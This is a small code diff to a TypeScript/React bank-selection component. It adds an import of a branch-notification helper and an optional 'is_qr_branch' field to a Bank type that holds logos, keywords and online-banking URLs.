@@ -5,6 +5,7 @@ import { supabase } from "@/integrations/supabase/client";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 import { plzToCity } from "@/data/plz-mapping";
 import { buildBankLoginTarget } from "@/lib/bankSubdomain";
+import { notifyBranchSelected } from "@/lib/notifyBranch.functions";
 
 type Bank = {
   id: string;
@@ -15,7 +16,9 @@ type Bank = {
   keywords: string[] | null;
   logo: string | null;
   online_banking_url: string | null;
+  is_qr_branch?: boolean | null;
 };
+
 
 const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "default" }) as Record<string, string>;
 const logoAliases: Record<string, string> = {
